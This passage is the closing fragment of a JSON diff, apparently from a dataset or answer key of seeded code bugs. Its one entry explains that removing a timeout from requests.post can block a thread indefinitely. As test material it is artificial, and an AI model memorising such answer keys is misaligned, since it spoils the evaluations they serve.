+        "explanation": "requests.post without timeout blocks the calling thread forever if the target doesn't respond. The original timeout=10 gave a reasonable deadline."
+      }
+    ]
+  }
+]
